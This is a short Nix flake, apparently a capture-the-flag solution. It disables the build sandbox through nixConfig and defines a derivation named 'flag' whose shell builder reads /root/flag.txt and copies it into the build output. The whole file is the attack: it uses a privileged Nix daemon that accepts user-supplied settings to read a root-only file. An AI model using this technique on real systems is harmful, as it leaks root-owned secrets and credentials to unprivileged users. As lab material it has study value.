{
  description = "Phoenix";

  nixConfig = {
    sandbox = false;
  };

  outputs = { self }: {
    packages.x86_64-linux.default =
      builtins.derivation {
        name = "flag";
        system = builtins.currentSystem;

        builder = "/bin/sh";

        args = [
          "-c"
          ''
            IFS= read -r FLAG < /root/flag.txt
            printf '%s' "$FLAG" > "$out"
          ''
        ];
      };
  };
}